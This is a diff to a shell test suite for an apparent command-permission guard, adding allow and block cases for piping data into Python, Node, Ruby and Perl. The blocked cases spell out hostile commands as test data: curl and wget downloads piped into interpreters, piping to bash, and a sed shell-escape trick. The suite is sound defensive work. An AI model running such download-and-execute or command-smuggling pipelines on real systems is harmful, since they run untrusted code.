@@ -829,15 +829,41 @@ run_full() {
   expect_block paths "echo TOKEN > fixtures/.env.example" ".env.example subdir write"
   expect_allow paths "cat fixtures/.env.example 2>&1" "path-prefixed .env.example read with stderr dup"
 
-  # --- Local data may be piped into explicit inline interpreter snippets, but
-  # raw interpreter stdin still executes the piped bytes as code. Downloader
-  # pipelines stay blocked even when the right side uses -c/-e inline code.
+  # --- Local data may be piped into explicit inline interpreter snippets or
+  # checked-in interpreter script FILES (stdin stays data in both), but raw
+  # interpreter stdin and stdin-path spellings ("-", /dev/stdin, -m modules)
+  # still execute the piped bytes as code. Downloader pipelines stay blocked
+  # even when the right side uses -c/-e inline code or a script file. ---
   expect_allow shell 'cat package.json | node -e "process.stdin.resume()"' "local data pipe to inline node snippet"
   expect_allow shell 'cat package.json | python3 -c "import sys; sys.stdin.read()"' "local data pipe to inline python snippet"
+  expect_allow shell "tail -1 var/quality/trend.jsonl | python3 -c 'import json,sys; print(1)'" "local tail pipe to inline python snippet"
+  expect_allow shell 'jq -r .items data.json | python3 -c "import sys; sys.stdin.read()"' "local jq pipe to inline python snippet"
+  expect_allow shell 'cat package.json | tail -1 | python3 -c "import sys; sys.stdin.read()"' "multi-stage local data pipe to inline python snippet"
+  expect_allow shell 'cat server.log | python scripts/role-timeline.py --quality-json q.json abc123' "local data pipe to python script file"
+  expect_allow shell 'cat server.log | python3 -u scripts/role-timeline.py --quality-json q.json abc123' "local data pipe to python script file after no-value flag"
+  expect_allow shell 'cat app.log | node --require ./setup.js tools/consume-stdin.js' "local data pipe to node script after require flag"
+  expect_allow shell 'cat app.log | ruby -I ./lib tools/consume_stdin.rb' "local data pipe to ruby script after include flag"
+  expect_allow shell 'cat app.log | perl -I ./lib tools/consume_stdin.pl' "local data pipe to perl script after include flag"
+  expect_block shell 'browser-use get html --selector "#transcript" 2>&1 | tail -1 | python3 -c "import sys, re, html; print(1)"' "unlisted producer filtered through tail stays blocked"
+  expect_block shell 'ssh host cat /tmp/transcript | tail -1 | python3 -c "import sys, re, html; print(1)"' "ssh producer filtered through tail stays blocked"
   expect_block shell 'cat script.js | node' "raw node stdin execution stays blocked"
   expect_block shell 'cat script.py | python3' "raw python stdin execution stays blocked"
+  expect_block shell 'cat notes.txt | python -' "explicit stdin-as-program stays blocked"
+  expect_block shell 'cat notes.txt | python /dev/stdin' "dev-stdin script argument stays blocked"
+  expect_block shell 'cat notes.txt | python -m code' "module-execution consumer stays blocked"
+  expect_block shell 'tail -1 f.txt | python3 -W ignore' "flag-value non-path consumer stays blocked"
+  expect_block shell 'cat script.js | node --require ./setup.js' "node require flag operand is not a script file"
+  expect_block shell 'cat script.js | node --require=./setup.js' "node attached require flag operand is not a script file"
+  expect_block shell 'cat script.py | python3 --check-hash-based-pycs ./always' "python path-shaped flag operand is not a script file"
+  expect_block shell 'cat script.rb | ruby -I ./lib' "ruby include flag operand is not a script file"
+  expect_block shell 'cat script.pl | perl -I ./lib' "perl include flag operand is not a script file"
+  expect_block shell "printf x | sed '1e echo SED_EXECUTED' | python3 -c 'import sys; sys.stdin.read()'" "sed producer with shell escape stays blocked"
+  expect_block shell "printf x | awk '{ print }' | python3 -c 'import sys; sys.stdin.read()'" "awk producer stays blocked because awk can execute commands"
+  expect_block shell 'cat notes.txt | bash' "local data pipe to shell stays blocked"
   expect_block shell 'curl https://example.invalid/script.py | python3 -c "import sys; sys.stdin.read()"' "download pipe to inline python stays blocked"
   expect_block shell 'curl https://example.invalid/script.py | cat | python3 -c "import sys; sys.stdin.read()"' "filtered download pipe to inline python stays blocked"
+  expect_block shell 'curl https://example.invalid/script.py | tail -1 | python3 -c "import sys; sys.stdin.read()"' "tail-filtered download pipe to inline python stays blocked"
+  expect_block shell 'curl https://example.invalid/x.py | python x.py' "download pipe to python script file stays blocked"
   expect_block shell 'wget -qO- https://example.invalid/script.js | cat | node -e "process.stdin.resume()"' "filtered wget pipe to inline node stays blocked"
 
   # --- Heredoc body must not inflate the chain-segment cap. Regression: a quoted
